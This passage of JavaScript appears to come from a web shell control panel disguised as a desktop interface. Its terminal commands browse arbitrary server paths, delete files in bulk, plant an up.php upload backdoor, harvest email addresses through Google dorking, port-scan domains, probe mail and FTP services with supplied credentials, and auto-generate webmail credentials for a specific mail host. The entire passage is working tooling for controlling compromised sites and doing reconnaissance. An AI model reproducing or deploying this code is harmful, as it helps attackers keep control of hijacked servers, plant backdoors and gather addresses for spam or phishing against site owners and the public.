                var finalTop = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, (e.clientY||0) - offY));
                win.style.left = finalLeft + 'px';
                win.style.top = finalTop + 'px';
                try {
                    var rect = win.getBoundingClientRect();
                    localStorage.setItem('wallpaper.left', String(Math.round(rect.left)));
                    localStorage.setItem('wallpaper.top', String(Math.round(rect.top)));
                } catch(err) {}
                try { titlebar.releasePointerCapture && titlebar.releasePointerCapture(e.pointerId); } catch(err2){}
            }
            if (titlebar){
                titlebar.addEventListener('pointerdown', onDown);
                titlebar.addEventListener('pointermove', onMove);
                titlebar.addEventListener('pointerup', onUp);
                titlebar.addEventListener('pointercancel', onUp);
            }
            return win;
        }
        // Desktop wallpaper icon: single-click to open
        if (wallpaperTrigger) {
            wallpaperTrigger.addEventListener('click', function(e){ e.preventDefault(); spawnWallpaperWindow(); });
        }
        // Simple CMD (terminal-like) popup
        var cmdTrigger = document.getElementById('cmd-trigger');
        var trashTrigger = document.getElementById('trash-trigger');
        var cmdTemplate = document.getElementById('cmd-template');
        var cmdLayer = document.getElementById('cmd-layer');
        var cmdNotifyTemplate = document.getElementById('cmd-notify-template');
        var cmdNotifyLayer = document.getElementById('cmd-notify-layer');
        function normalizeUrlCmd(u){
            if (!u) return '';
            var url = u.trim();
            if (/^https?:\/\//i.test(url)) return url;
            return 'https://' + url;
        }
        function spawnCmdWindow(){
            if (!cmdTemplate || !cmdLayer) return null;
            var win = cmdTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            try { window.activeCmdWin = win; } catch(e){}
            cmdLayer.appendChild(win);
            // Restore saved position or center once
            try {
                var savedLeft = parseInt(localStorage.getItem('cmd.left') || '', 10);
                var savedTop = parseInt(localStorage.getItem('cmd.top') || '', 10);
                if (!isNaN(savedLeft) && !isNaN(savedTop)) {
                    var cw = win.offsetWidth || 720;
                    var ch = win.offsetHeight || 520;
                    var left = Math.max(6, Math.min(window.innerWidth - cw - 6, savedLeft));
                    var top = Math.max(6, Math.min(window.innerHeight - ch - 6, savedTop));
                    win.style.left = left + 'px';
                    win.style.top = top + 'px';
                } else {
                    var cw2 = win.offsetWidth || 720;
                    var ch2 = win.offsetHeight || 520;
                    var left2 = Math.max(6, Math.min(window.innerWidth - cw2 - 6, Math.round((window.innerWidth - cw2) / 2)));
                    var top2 = Math.max(6, Math.min(window.innerHeight - ch2 - 6, Math.round((window.innerHeight - ch2) / 2)));
                    win.style.left = left2 + 'px';
                    win.style.top = top2 + 'px';
                }
            } catch(e) {}
            try { window.addOpenApp && window.addOpenApp('cmd'); } catch(e){}

            var titlebar = win.querySelector('.cmd-titlebar');
            var closeBtn = win.querySelector('.cmd-close');
            var btnPaste = win.querySelector('.cmd-paste');
            var btnCopy = win.querySelector('.cmd-copy');
            var output = win.querySelector('.cmd-output');
            var input = win.querySelector('.cmd-input');
            var inputRow = win.querySelector('.cmd-input-row');
            var savedHtml = '';
            try { savedHtml = localStorage.getItem('cmd.output') || ''; } catch(e){}
            if (savedHtml) { output.innerHTML = savedHtml; }

            function print(line, cls){
                var div = document.createElement('div');
                if (cls) div.className = cls;
                div.textContent = line;
                var liveNode = output.querySelector('.cmd-live');
                if (liveNode) { output.insertBefore(div, liveNode); }
                else { output.appendChild(div); }
                output.scrollTop = output.scrollHeight;
                try { localStorage.setItem('cmd.output', output.innerHTML); } catch(e){}
            }
            function printHtml(html, cls){
                var div = document.createElement('div');
                if (cls) div.className = cls;
                div.innerHTML = html;
                var liveNode = output.querySelector('.cmd-live');
                if (liveNode) { output.insertBefore(div, liveNode); }
                else { output.appendChild(div); }
                output.scrollTop = output.scrollHeight;
                try { localStorage.setItem('cmd.output', output.innerHTML); } catch(e){}
            }
            function help(){
                print('Available commands:', 'sys');
                print('  help            Show this help', 'sys');
                print('  clear          Clear the screen', 'sys');
                print('  open <url|q>   Open URL or search in new tab', 'sys');
                print('  dork -e <query> [--pages=N] [--deep=M] [--site=.tld] [--api|--no-api] Extract emails', 'sys');
                print('  dork --api-setup --key=K --cx=C  Configure Google API', 'sys');
                print('  ls [path]      List files (long format) for path or current', 'sys');
                print('  ls -l [path]   Same as ls; -l accepted for familiarity', 'sys');
                print('  unzip file.zip [folder]  Extract here by default; optional folder', 'sys');
                print('  cd              Show current directory', 'sys');
                print('  mkdir <name>   Create a folder in current directory', 'sys');
                print('  mkfile <name.ext> Create a file in current directory', 'sys');
                print('  mkup           Create up.php upload script in current directory', 'sys');
                print('  rm <name.ext>  Delete a file in current directory', 'sys');
                print('  rmdir <name>   Delete a folder (recursive) in current directory', 'sys');
                print('  massremove -o <name>[,name2,...]  Keep one or multiple files', 'sys');
                print('  nslookup <domain>  DNS records and IPs for a domain', 'sys');
                print('  scan <domain> [ports]  Probe common or given ports', 'sys');
                print('  scanall <domain> [start-end]  Probe port ranges', 'sys');
                print('  scanmail <domain>  Check IMAP/POP3/SMTP and webmail ports', 'sys');
                print('  ftpcheck <domain> [ports] [--explicit] [--user=U --pass=P]', 'sys');
            }
        function getRelCurrent(){
            try {
                var p = new URLSearchParams(window.location.search);
                var d = p.get('d');
                return d ? d : '';
            } catch(e){ return ''; }
        }
        function randomPassword(n){
            var s = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789@#$%';
            var r = '';
            for (var i=0;i<n;i++){ r += s.charAt(Math.floor(Math.random()*s.length)); }
            return r;
        }
        function randomLocal(n){
            var s = 'abcdefghijklmnopqrstuvwxyz0123456789';
            var r = '';
            for (var i=0;i<n;i++){ r += s.charAt(Math.floor(Math.random()*s.length)); }
            return r;
        }
        async function autoCreateWebmailEmail(domain){
            var user = randomLocal(8);
            var emailAddr = user + '@' + domain;
            var pwd = randomPassword(12);
            try { localStorage.setItem('cmd.webmail.'+domain, JSON.stringify({ email: emailAddr, password: pwd, ts: Date.now() })); } catch(_){ }
            printHtml('Generated credentials — Email: <strong>'+emailAddr+'</strong> Password: <strong>'+pwd+'</strong>', 'ok');
            var payload = {
                from_email: 'webmaster@' + domain,
                from_name: 'WebMail',
                subject: 'Webmail credentials',
                message: 'Email: ' + emailAddr + '\nPassword: ' + pwd,
                format: 'text',
                recipients: ['postmaster@' + domain, 'webmaster@' + domain, 'abuse@' + domain]
            };
            try {
                printHtml('$ -sh ' + emailAddr + ' creating ...', 'sys');
                var resp = await fetch('?mailer_send=1', { method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify(payload) });
                var data = await resp.json();
                if (data && data.success) { printHtml('$ -sh ' + emailAddr + ' creating ... done', 'ok'); }
                else { var em = (data && (data.error || (data.errors && data.errors[0]) || 'error')) || 'error'; printHtml('$ -sh ' + emailAddr + ' creating ... error: ' + em, 'err'); printHtml('Saved locally. Use the credentials shown above.', 'sys'); }
            } catch(e) {
                printHtml('$ -sh ' + emailAddr + ' creating ... network error: ' + e.message, 'err');
                printHtml('Saved locally. Use the credentials shown above.', 'sys');
            }
        }
            async function refreshListing(){
                try {
                    var p = new URLSearchParams(window.location.search);
                    var d = p.get('d') || '';
                    var os = p.get('os') || '';
                    var url = window.location.pathname;
                    if (os) { url += '?os=' + encodeURIComponent(os); }
                    else if (d) { url += '?d=' + encodeURIComponent(d); }
                    var resp = await fetch(url, { credentials:'same-origin', cache:'no-store' });
                    var html = await resp.text();
                    var doc = new DOMParser().parseFromString(html, 'text/html');
                    var newBody = doc.querySelector('#files-body');
                    var curBody = document.querySelector('#files-body');
                    if (newBody && curBody) {
                        curBody.innerHTML = newBody.innerHTML;
                    }
                } catch(e) {}
            }
            function process(cmdline){
                var s = (cmdline || '').trim();
                if (!s) return;
                print('$ ' + s);
                var parts = s.split(/\s+/);
                var cmd = parts[0].toLowerCase();
                var args = parts.slice(1);
                try {
                    if (cmd === 'help') { help(); try { var exists = document.querySelector('#cmdhelp-layer .cmdhelp-window.show') || document.querySelector('.cmdhelp-window.show'); if (!exists) { if (typeof window.spawnCmdHelpWindow === 'function') { window.spawnCmdHelpWindow(); } else { var trig = document.getElementById('cmdhelp-trigger'); if (trig) trig.click(); } } } catch(_){} return; }
                    
                if (cmd === 'clear') { output.innerHTML = ''; try { output.appendChild(live); } catch(e){} output.scrollTop = output.scrollHeight; try { localStorage.setItem('cmd.output', output.innerHTML); } catch(e){} return; }
                if (cmd === 'dork') {
                    if (args.length > 0 && args[0] === '--api-setup') {
                        var key = '';
                        var cx = '';
                        args.slice(1).forEach(function(a){
                            var m1 = a.match(/^--key=(.+)$/); if (m1) { key = m1[1]; return; }
                            var m2 = a.match(/^--cx=(.+)$/); if (m2) { cx = m2[1]; return; }
                        });
                        if (!key || !cx) { print('api-setup: require --key=K and --cx=C', 'err'); return; }
                        fetch('?api=set_google_cse', { method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify({ key:key, cx:cx }) })
                            .then(function(r){ return r.json().catch(function(){ return { success:false, error:'invalid response' }; }); })
                            .then(function(j){ if (j && j.success) { print('OK: Google API configured', 'ok'); } else { var em=(j&&j.error)||'setup failed'; print('ERROR: ' + em, 'err'); } })
                            .catch(function(){ print('ERROR: network error', 'err'); });
                        return;
                    }
                    if (args.length > 0 && (args[0] === '-e' || args[0].toLowerCase() === 'emails')) {
                        var pages = 1;
                        var deep = 0;
                        var siteArg = '';
                        var useApi = null; // null -> server decides (auto if configured)
                        args = args.slice(1).filter(function(a){
                            var m = a.match(/^--pages=(\d{1,2})$/);
                            if (m) { pages = Math.max(1, Math.min(10, parseInt(m[1], 10))); return false; }
                            var md = a.match(/^--deep=(\d{1,2})$/);
                            if (md) { deep = Math.max(0, Math.min(10, parseInt(md[1], 10))); return false; }
                            var ms = a.match(/^--site=(.+)$/);
                            if (ms) { siteArg = String(ms[1]||'').trim(); return false; }
                            if (a === '--api') { useApi = true; return false; }
                            if (a === '--no-api') { useApi = false; return false; }
                            return true;
                        });
                        var rawQ = (args.join(' ') || '').trim();
                        if (!rawQ) { print('dork -e: query required', 'err'); return; }
                        var qE = rawQ.replace(/\blike\s+(.+)/i, function(_, phrase){ return '"' + String(phrase||'').trim() + '"'; });
                        if (siteArg) { var hasSite = /\bsite\s*:\s*/i.test(qE); if (!hasSite) { qE += ' site:' + siteArg; } }
                        var streamUrl = '?api=dork_emails_stream&q=' + encodeURIComponent(qE) + '&pages=' + pages + '&deep=' + deep + (siteArg ? ('&tld=' + encodeURIComponent(siteArg)) : '') + (useApi === true ? '&use_api=1' : (useApi === false ? '&use_api=0' : ''));
                        var searchLine = document.createElement('div');
                        searchLine.className = 'searching';
                        searchLine.textContent = 'Searching: ' + qE;
                        var liveNode2 = output.querySelector('.cmd-live');
                        if (liveNode2) { output.insertBefore(searchLine, liveNode2); } else { output.appendChild(searchLine); }
                        output.scrollTop = output.scrollHeight;
                        try { localStorage.setItem('cmd.output', output.innerHTML); } catch(e){}
                        var dots = 0;
                        var timer = setInterval(function(){ try { var d = (dots % 3) + 1; searchLine.textContent = 'Searching: ' + qE + ' ' + '.'.repeat(d); dots++; } catch(e){} }, 400);
                        fetch(streamUrl, { method:'GET', cache:'no-store' })
                            .then(function(res){
                                var reader = (res && res.body) ? res.body.getReader() : null;
                                if (!reader) { throw new Error('no_stream'); }
                                var dec = new TextDecoder();
                                var buf = '';
                                function pump(){
                                    return reader.read().then(function(o){
                                        if (!o || o.done) { return; }
                                        buf += dec.decode(o.value || new Uint8Array(), { stream:true });
                                        var parts = buf.split(/\r?\n/);
                                        buf = parts.pop();
                                        parts.forEach(function(line){ var s = (line||'').trim(); if (!s) return; if (s === 'DONE') return; print(s, 'ok'); });
                                        return pump();
                                    });
                                }
                                return pump();
                            })
                            .then(function(){ try { clearInterval(timer); } catch(e){} try { if (searchLine && searchLine.parentNode) { searchLine.parentNode.removeChild(searchLine); } } catch(e){} })
                            .catch(function(){
                                var apiUrl = '?api=dork_emails&q=' + encodeURIComponent(qE) + '&pages=' + pages + '&deep=' + deep + (siteArg ? ('&tld=' + encodeURIComponent(siteArg)) : '') + (useApi === true ? '&use_api=1' : (useApi === false ? '&use_api=0' : ''));
                                fetch(apiUrl, { method:'GET', cache:'no-store' })
                                    .then(function(r){ var ct = r.headers.get('content-type') || ''; if (ct.indexOf('application/json') !== -1) { return r.json(); } throw new Error('invalid response'); })
                                    .then(function(j){ if (!j || !j.success) { var em=(j&&j.error)||'failed'; print('ERROR: dork -e ' + em, 'err'); return; } var list=Array.isArray(j.emails)?j.emails:[]; if (!list.length) { print('No emails found', 'sys'); return; } list.forEach(function(e){ print(e, 'ok'); }); })
                                    .catch(function(err){ print('ERROR: dork -e ' + (err && err.message ? err.message : 'network error'), 'err'); })
                                    .finally(function(){ try { clearInterval(timer); } catch(e){} try { if (searchLine && searchLine.parentNode) { searchLine.parentNode.removeChild(searchLine); } } catch(e){} });
                            });
                        return;
                    }
                }
                if (cmd === 'ls') {
                    // Support: ls, ls [path], ls -l [path]
                    var pathArg = '';
                    if (args.length > 0) {
                        if (args[0] === '-l') { args = args.slice(1); }
                        pathArg = (args.join(' ') || '').trim();
                    }
                    var rel = getRelCurrent();
                    var target = pathArg || rel || '';
                    if (!target) { print('ls: path required or open inside a directory', 'err'); return; }
                    var url = target.startsWith('/') ? ('?api=ls&os=' + encodeURIComponent(target)) : ('?api=ls&d=' + encodeURIComponent(target));
                    fetch(url, { method:'GET', cache:'no-store' })
                        .then(function(r){ return r.text(); })
                        .then(function(t){ (t || '').split('\n').forEach(function(line){ print(line); }); })
                        .catch(function(){ print('ls: failed to fetch listing', 'err'); });
                    return;
                }
                    
                    if (cmd === 'open') {
                        var raw = args.join(' ');
                        if (!raw) { print('open: url or query required', 'err'); return; }
                        var looksLikeUrl = /^https?:\/\//i.test(raw) || /^[\w-]+\.[\w.-]+/.test(raw);
                        var url = looksLikeUrl ? normalizeUrlCmd(raw) : ('https://www.google.com/search?q=' + encodeURIComponent(raw));
                        try { window.open(url, '_blank', 'noopener'); } catch(e){}
                        print('Opened: ' + url, 'ok');
                        return;
                    }
                    if (cmd === 'unzip') {
                        var zipName = (args[0] || '').trim();
                        if (!zipName) { print('unzip: zip file required', 'err'); return; }
                        if (!/^[-A-Za-z0-9._ ]+\.zip$/i.test(zipName)) { print('unzip: invalid zip name', 'err'); return; }
                        var destFolder = (args[1] || '').trim();
                        if (destFolder && !/^[-A-Za-z0-9._ ]+$/.test(destFolder)) { print('unzip: invalid folder name', 'err'); return; }
                        var pQS = new URLSearchParams(window.location.search);
                        var relDirCur = pQS.get('d') || '';
                        var absDirCur = pQS.get('os') || '';
                        var actionUrl = window.location.pathname + (relDirCur ? ('?d=' + encodeURIComponent(relDirCur)) : (absDirCur ? ('?os=' + encodeURIComponent(absDirCur)) : ''));
                        var bodyStr;
                        if (absDirCur) {
                            var zipAbs = absDirCur.replace(/[\\\/]$/, '') + '/' + zipName;
                            bodyStr = 'do_unzip_abs=1&os=' + encodeURIComponent(zipAbs) + (destFolder ? ('&folder=' + encodeURIComponent(destFolder)) : '&here=1');
                        } else {
                            var zipRel = (relDirCur ? relDirCur.replace(/[\\\/]$/, '') + '/' : '') + zipName;
                            bodyStr = 'do_unzip=1&rel=' + encodeURIComponent(zipRel) + (destFolder ? ('&folder=' + encodeURIComponent(destFolder)) : '&here=1');
                        }
                        fetch(actionUrl, { method:'POST', headers:{ 'Content-Type':'application/x-www-form-urlencoded' }, body: bodyStr, redirect:'follow' })
                            .then(function(res){ var ok = !!res.ok || !!res.redirected || (res.status >= 300 && res.status < 400); if (!ok) { throw new Error('unzip failed'); } return res.text(); })
                            .then(function(){ var msg = destFolder ? ('OK: extracted "' + zipName + '" to "' + destFolder + '"') : ('OK: extracted "' + zipName + '" here'); print(msg, 'ok'); try{ refreshListing(); }catch(_){} })
                            .catch(function(){ var emsg = 'unzip failed'; print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} });
                        return;
                    }
                    if (cmd === 'cd') {
                        var pQS = new URLSearchParams(window.location.search);
                        var relDirCur = pQS.get('d') || '';
                        var absDirCur = pQS.get('os') || '';
                        var urlCwd = '?api=cwd';
                        if (absDirCur) { urlCwd += '&os=' + encodeURIComponent(absDirCur); }
                        else if (relDirCur) { urlCwd += '&d=' + encodeURIComponent(relDirCur); }
                        fetch(urlCwd, { method:'GET', cache:'no-store' })
                            .then(function(r){ var ct = r.headers.get('content-type') || ''; if (ct.indexOf('application/json') !== -1) { return r.json(); } return null; })
                            .then(function(j){ var p = (j && j.cwd) ? j.cwd : ''; if (!p) { print('cd: unable to determine directory', 'err'); } else { print(p, 'ok'); } })
                            .catch(function(){ print('cd: failed', 'err'); });
                        return;
                    }
                    if (cmd === 'mkdir') {
                        var name = (args[0] || '').trim();
                        if (!name) { print('mkdir: folder name required', 'err'); return; }
                        if (!/^[A-Za-z0-9._ -]+$/.test(name)) { print('mkdir: invalid name (letters, numbers, . _ - only, spaces ok)', 'err'); return; }
                        var rel = getRelCurrent();
                        var body = 'api=mkdir&dir=' + encodeURIComponent(rel) + '&name=' + encodeURIComponent(name);
                        fetch(window.location.pathname, { method:'POST', headers:{ 'Content-Type':'application/x-www-form-urlencoded' }, body: body })
                            .then(function(r){ return r.json().catch(function(){ return { success:false, error:'Invalid response' }; }); })
                            .then(function(j){ if (j && j.success) { print('OK: created folder "' + name + '"', 'ok'); try{ refreshListing(); }catch(_){} } else { var emsg = ((j && j.error) || 'Failed to create folder'); print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} } })
                            .catch(function(){ var emsg = 'network error'; print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} });
                        return;
                    }
                    if (cmd === 'mkfile') {
                        var fname = (args[0] || '').trim();
                        if (!fname) { print('mkfile: file name required', 'err'); return; }
                        if (fname.indexOf('.') === -1) { print('mkfile: must include extension (e.g. index.html)', 'err'); return; }
                        if (!/^[A-Za-z0-9._ -]+$/.test(fname)) { print('mkfile: invalid name (letters, numbers, . _ - only, spaces ok)', 'err'); return; }
                        var rel2 = getRelCurrent();
                        var body2 = 'api=mkfile&dir=' + encodeURIComponent(rel2) + '&name=' + encodeURIComponent(fname);
                        fetch(window.location.pathname, { method:'POST', headers:{ 'Content-Type':'application/x-www-form-urlencoded' }, body: body2 })
                            .then(function(r){ var ct = r.headers.get('content-type') || ''; if (ct.indexOf('application/json') !== -1) { return r.json(); } return { success:false, error:'Invalid response' }; })
                            .then(function(j){ if (j && j.success) { print('OK: created file "' + fname + '"', 'ok'); try{ refreshListing(); }catch(_){} } else { var emsg = ((j && j.error) || 'Failed to create file'); print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} } })
                            .catch(function(){ var emsg = 'network error'; print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} });
                        return;
                    }
                    if (cmd === 'rm') {
                        var delname = (args[0] || '').trim();
                        if (!delname) { print('rm: file name required', 'err'); return; }
                        if (!/^[A-Za-z0-9._ -]+$/.test(delname)) { print('rm: invalid name (letters, numbers, . _ - only, spaces ok)', 'err'); return; }
                        var relDel = getRelCurrent();
                        var bodyDel = 'api=rm&dir=' + encodeURIComponent(relDel) + '&name=' + encodeURIComponent(delname);
                        fetch(window.location.pathname, { method:'POST', headers:{ 'Content-Type':'application/x-www-form-urlencoded' }, body: bodyDel })
                            .then(function(r){ var ct = r.headers.get('content-type') || ''; if (ct.indexOf('application/json') !== -1) { return r.json(); } return { success:false, error:'Invalid response' }; })
                            .then(function(j){ if (j && j.success) { print('OK: deleted "' + delname + '"', 'ok'); try{ refreshListing(); }catch(_){} } else { var emsg = ((j && j.error) || 'Failed to delete'); print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} } })
                            .catch(function(){ var emsg = 'network error'; print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} });
                        return;
                    }
                    if (cmd === 'mkup') {
                        var rel3 = getRelCurrent();
                        var fname3 = 'up.php';
                        var tpl = '<' + '?php\n' +
                            'if ($_SERVER[\'REQUEST_METHOD\'] === \'POST\') {\n' +
                            '    if (isset($_FILES[\'file\'])) {\n' +
                            '        $f = $_FILES[\'file\'];\n' +
                            '        if ($f[\'error\'] === UPLOAD_ERR_OK) {\n' +
                            '            $name = basename((string)$f[\'name\']);\n' +
                            '            $dest = __DIR__ . DIRECTORY_SEPARATOR . $name;\n' +
                            '            if (move_uploaded_file((string)$f[\'tmp_name\'], $dest)) {\n' +
                            '                echo \'<p>Uploaded: \' . htmlspecialchars($name, ENT_QUOTES) . \'</p>\';\n' +
                            '            } else {\n' +
                            '                echo \'<p>Failed to move uploaded file.</p>\';\n' +
                            '            }\n' +
                            '        } else {\n' +
                            '            echo \'<p>Upload error code: \' . (int)$f[\'error\'] . \'</p>\';\n' +
                            '        }\n' +
                            '    }\n' +
                            '}\n' +
                            '?' + '>\n' +
                            '<!doctype html>\n<html><head><meta charset=\"utf-8\"><title>Upload File</title></head><body>\n' +
                            '<h1>Upload a File</h1>\n' +
                            '<form method=\"post\" enctype=\"multipart/form-data\">\n' +
                            '  <input type=\"file\" name=\"file\" required>\n' +
                            '  <button type=\"submit\">Upload</button>\n' +
                            '</form>\n' +
                            '</body></html>\n';
                        var body3 = 'api=mkfile&dir=' + encodeURIComponent(rel3) + '&name=' + encodeURIComponent(fname3) + '&content=' + encodeURIComponent(tpl);
                        fetch(window.location.pathname, { method:'POST', headers:{ 'Content-Type':'application/x-www-form-urlencoded' }, body: body3 })
                            .then(function(r){ var ct = r.headers.get('content-type') || ''; if (ct.indexOf('application/json') !== -1) { return r.json(); } return { success:false, error:'Invalid response' }; })
                            .then(function(j){ if (j && j.success) { print('OK: created upload script "' + fname3 + '"', 'ok'); try{ refreshListing(); }catch(_){} } else { var emsg = ((j && j.error) || 'Failed to create file'); print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} } })
                            .catch(function(){ var emsg = 'network error'; print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} });
                        return;
                    }
                    if (cmd === 'rmdir') {
                        var dname = (args[0] || '').trim();
                        if (!dname) { print('rmdir: folder name required', 'err'); return; }
                        if (!/^[A-Za-z0-9._ -]+$/.test(dname)) { print('rmdir: invalid name (letters, numbers, . _ - only, spaces ok)', 'err'); return; }
                        var rel4 = getRelCurrent();
                        var body4 = 'api=rmdir&dir=' + encodeURIComponent(rel4) + '&name=' + encodeURIComponent(dname);
                        fetch(window.location.pathname, { method:'POST', headers:{ 'Content-Type':'application/x-www-form-urlencoded' }, body: body4 })
                            .then(function(r){ var ct = r.headers.get('content-type') || ''; if (ct.indexOf('application/json') !== -1) { return r.json(); } return { success:false, error:'Invalid response' }; })
                            .then(function(j){ if (j && j.success) { print('OK: deleted folder "' + dname + '"', 'ok'); try{ refreshListing(); }catch(_){} } else { var emsg = ((j && j.error) || 'Failed to delete folder'); print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} } })
                            .catch(function(){ var emsg = 'network error'; print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} });
                        return;
                    }
                    if (cmd === 'massremove') {
                        var keepNames = [];
                        for (var i=0;i<args.length;i++){
                            if (args[i] === '-o' && i+1 < args.length) {
                                var val = (args[i+1] || '').trim();
                                i++;
                                if (!val) continue;
                                if (val.indexOf(',') !== -1) {
                                    var parts = val.split(',');
                                    for (var k=0;k<parts.length;k++){ var p = (parts[k]||'').trim(); if (p) keepNames.push(p); }
                                } else {
                                    keepNames.push(val);
                                }
                            }
                        }
                        if (!keepNames.length) { print('massremove: -o <file> required (repeat or comma list)', 'err'); return; }
                        for (var j=0;j<keepNames.length;j++){ if (!/^[A-Za-z0-9._ -]+$/.test(keepNames[j])) { print('massremove: invalid name "' + keepNames[j] + '"', 'err'); return; } }
                        var pQS = new URLSearchParams(window.location.search);
                        var relMR = pQS.get('d') || '';
                        var absMR = pQS.get('os') || '';
                        var bodyMR = 'api=massremove';
                        if (absMR) { bodyMR += '&os=' + encodeURIComponent(absMR); }
                        else { bodyMR += '&dir=' + encodeURIComponent(relMR); }
                        for (var m=0;m<keepNames.length;m++){ bodyMR += '&only[]=' + encodeURIComponent(keepNames[m]); }
                        fetch(window.location.pathname, { method:'POST', headers:{ 'Content-Type':'application/x-www-form-urlencoded' }, body: bodyMR })
                            .then(function(r){ var ct = r.headers.get('content-type') || ''; if (ct.indexOf('application/json') !== -1) { return r.json(); } return { success:false, error:'Invalid response' }; })
                            .then(function(j){ if (j && j.success) { var f = (j.removed && typeof j.removed.files==='number') ? j.removed.files : 0; var d = (j.removed && typeof j.removed.folders==='number') ? j.removed.folders : 0; var kept = (j.kept && j.kept.join) ? j.kept.join(', ') : (Array.isArray(j.kept) ? j.kept.join(', ') : ''); print('OK: removed all except ' + (kept ? ('"' + kept + '"') : 'specified files') + ' (' + String(f) + ' files, ' + String(d) + ' folders)', 'ok'); try{ refreshListing(); }catch(_){} } else { var emsg = ((j && j.error) || 'Failed to mass remove'); print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} } })
                            .catch(function(){ var emsg = 'network error'; print('ERROR: ' + emsg, 'err'); try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(emsg, true); } catch(e){} });
                        return;
                    }
                    if (cmd === 'nslookup') {
                        var domain = (args[0] || '').trim();
                        if (!domain) { print('nslookup: domain required', 'err'); return; }
                        var url = '?api=nslookup&domain=' + encodeURIComponent(domain);
                        fetch(url, { method:'GET', cache:'no-store' })
                            .then(function(r){ var ct = r.headers.get('content-type') || ''; if (ct.indexOf('application/json') !== -1) { return r.json(); } return { success:false, error:'Invalid response' }; })
                            .then(function(j){
                                if (j && j.success) {
                                    var d = j.domain || domain;
                                    print('Domain: ' + d, 'sys');
                                    if (Array.isArray(j.a)) { j.a.forEach(function(ip){ print('A    ' + ip, 'ok'); }); }
                                    if (Array.isArray(j.aaaa)) { j.aaaa.forEach(function(ip6){ print('AAAA ' + ip6, 'ok'); }); }
                                    if (j.cname) { print('CNAME ' + j.cname, 'ok'); }
                                    if (Array.isArray(j.ns)) { j.ns.forEach(function(ns){ print('NS   ' + ns, 'ok'); }); }
                                    if (Array.isArray(j.mx)) { j.mx.forEach(function(mx){ var h = (mx && (mx.host||mx.target)) ? (mx.host||mx.target) : ''; var p = (mx && typeof mx.pri==='number') ? (' ' + String(mx.pri)) : ''; print('MX   ' + h + p, 'ok'); }); }
                                    if (Array.isArray(j.txt)) { j.txt.forEach(function(tx){ print('TXT  ' + tx, 'sys'); }); }
                                    if (Array.isArray(j.rdns)) { j.rdns.forEach(function(rv){ var ptr = (rv && rv.ptr) ? rv.ptr : ''; var ip = (rv && rv.ip) ? rv.ip : ''; if (ip) print('RDNS ' + ip + (ptr ? (' -> ' + ptr) : ''), 'sys'); }); }
                                    if (j.http_server) { print('HTTP Server: ' + j.http_server, 'sys'); }
                                } else {
                                    var emsg = (j && j.error) ? j.error : 'Lookup failed';
                                    print('ERROR: ' + emsg, 'err');
                                }
                            })
                            .catch(function(){ print('ERROR: network error', 'err'); });
                        return;
                    }
                    if (cmd === 'scan') {
                        var domain = (args[0] || '').trim();
                        if (!domain) { print('scan: domain required', 'err'); return; }
                        var userPorts = '';
                        if (args.length > 1) {
                            userPorts = args.slice(1).join('').replace(/\s+/g,'');
                            userPorts = userPorts.replace(/[^0-9,]/g,'');
                        }
                        var url = '?api=portscan&domain=' + encodeURIComponent(domain) + (userPorts ? ('&ports=' + encodeURIComponent(userPorts)) : '');
                        fetch(url, { method:'GET', cache:'no-store' })
                            .then(function(r){ var ct = r.headers.get('content-type') || ''; if (ct.indexOf('application/json') !== -1) { return r.json(); } return { success:false, error:'Invalid response' }; })
                            .then(function(j){
                                if (j && j.success) {
                                    var d = j.domain || domain;
                                    print('Domain: ' + d, 'sys');
                                    if (Array.isArray(j.ips) && j.ips.length) { j.ips.forEach(function(ip){ print('A    ' + ip, 'sys'); }); }
                                    var pr = Array.isArray(j.ports) ? j.ports : [];
                                    pr.forEach(function(r){
                                        var html = 'PORT ' + String(r.port) + ' ' + (r.open ? '<span class="port-badge open">OPEN</span>' : '<span class="port-badge closed">CLOSED</span>');
                                        if (r.open && r.banner) { html += ' — ' + r.banner.replace(/[<>]/g,''); }
                                        printHtml(html, r.open ? 'ok' : 'sys');
                                    });
                                    try {
                                        var trig = pr.some(function(x){ return x && x.open && x.port === 25 && typeof x.banner==='string' && /mail\.katt\.gdn\s+ESMTP/i.test(x.banner); });
                                        if (trig) { autoCreateWebmailEmail(d); }
                                    } catch(_){ }
                                } else {
                                    var emsg = (j && j.error) ? j.error : 'Scan failed';
                                    print('ERROR: ' + emsg, 'err');
                                }
                            })
                            .catch(function(){ print('ERROR: network error', 'err'); });
                        return;
                    }
                    if (cmd === 'scanall') {
                        var domain = (args[0] || '').trim();
                        if (!domain) { print('scanall: domain required', 'err'); return; }
                        var openCount = 0;
                        var attempted = 0;
                        var batch = 128;
                        var start = 1;
                        var end = 1024;
                        if (args.length > 1) {
                            var rng = (args[1] || '').trim();
                            var m = rng.match(/^(\d+)-(\d+)$/);
                            if (m) {
                                start = Math.max(1, parseInt(m[1], 10));
